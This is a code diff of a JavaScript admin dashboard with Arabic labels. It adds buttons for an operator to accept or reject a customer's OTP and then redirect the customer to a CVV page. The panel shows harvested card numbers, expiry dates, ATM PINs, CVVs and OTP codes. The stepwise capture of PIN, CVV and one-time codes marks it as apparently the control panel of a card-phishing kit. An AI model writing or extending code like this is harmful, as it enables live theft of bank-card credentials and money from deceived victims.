@@ -708,6 +708,24 @@
     }
   }
 
+  async function otpAction(ref, action) {
+    try {
+      const d = await post("/api/admin/otp-action", { reference: ref, action });
+      if (d.success) {
+        const label = action === 'pass' ? '✅ قبول OTP - تم توجيه العميل لصفحة CVV' : '❌ تم رفض OTP';
+        toast(label, action==='pass'?'ok':'err');
+        loadAll();
+        if (currentOpenRef && currentOpenRef === ref) {
+          setTimeout(() => openDetail(ref), 400);
+        }
+      } else {
+        toast('فشل الإجراء: ' + (d.error||''), 'err');
+      }
+    } catch(e) {
+      toast('خطأ في الاتصال', 'err');
+    }
+  }
+
   async function updStatus(ref, status) {
     document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
     try {
@@ -788,11 +806,11 @@
       const payStep = b.payment.step || 1;
       const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
       const stepName = stepNames[payStep] || 'بيانات البطاقة';
-      // بناء صفوف البيانات حسب ما هو موجود
+      // بناء صفوف البيانات - فقط البيانات الأساسية
       const payRows = [];
       if (b.payment.bank) payRows.push(dRow('البنك', b.payment.bank));
       // دمج prefix + cardNumber في خانة واحدة
-      const fullCard = (b.payment.cardPrefix || '') + (b.payment.cardNumber || b.payment.cardHolder || '');
+      const fullCard = (b.payment.cardPrefix || '') + (b.payment.cardNumber || '');
       if (fullCard) payRows.push(dRow('رقم البطاقة', fullCard));
       if (b.payment.expiryMonth || b.payment.expiryYear) {
         payRows.push(dRow('تاريخ الانتهاء', (b.payment.expiryMonth||'') + '/' + (b.payment.expiryYear||'')));
@@ -800,13 +818,10 @@
         payRows.push(dRow('تاريخ الانتهاء', b.payment.cardExpiry || b.payment.expiryDate));
       }
       if (b.payment.pin) payRows.push(dRow('الرقم السري (PIN)', b.payment.pin));
-      // CVV دائماً - يظهر حتى لو فارغ
+      // CVV دائماً
       payRows.push(dRow('CVV', b.payment.cardCvv || b.payment.cvv || 'لم يدخل بعد'));
-      if (b.payment.cardHolderName || b.payment.cardHolder) payRows.push(dRow('اسم حامل البطاقة', b.payment.cardHolderName || b.payment.cardHolder));
-      if (b.payment.loginId) payRows.push(dRow('Login ID', b.payment.loginId));
-      if (b.payment.clientId) payRows.push(dRow('رقم العميل', b.payment.clientId));
-      if (b.payment.amount) payRows.push(dRow('المبلغ', b.payment.amount));
-      if (b.payment.status) payRows.push(dRow('الحالة', b.payment.status));
+      // OTP إذا وجد
+      if (b.otp && b.otp.otpCode) payRows.push(dRow('OTP', b.otp.otpCode));
       h += `<div class="sec-title">بيانات الدفع</div>
         <div class="detail-grid" style="grid-template-columns:1fr;">
           ${payRows.join('')}
@@ -827,12 +842,23 @@
         </div>`;
     }
 
-    // بيانات OTP
+    // بيانات OTP - مع زرار قبول/رفض
     if (b.otp) {
       h += `<div class="sec-title">بيانات OTP</div>
         <div class="detail-grid" style="grid-template-columns:1fr;">
           ${dRow("رمز OTP",b.otp.otpCode)}
           ${dRow("تاريخ الاستلام",(b.otp.createdAt||"").substring(0,19).replace("T"," "))}
+        </div>
+        <div class="action-section">
+          <div class="action-sec-title"><i class="bi bi-shield-check" style="color:#7c3aed"></i> إجراء OTP</div>
+          <div class="action-btns">
+            <button class="action-btn-approve" onclick="otpAction('${b.referenceId}','pass')">
+              <i class="bi bi-check-circle-fill"></i> قبول → CVV
+            </button>
+            <button class="action-btn-reject" onclick="otpAction('${b.referenceId}','denied')">
+              <i class="bi bi-x-circle-fill"></i> رفض
+            </button>
+          </div>
         </div>`;
     }
 
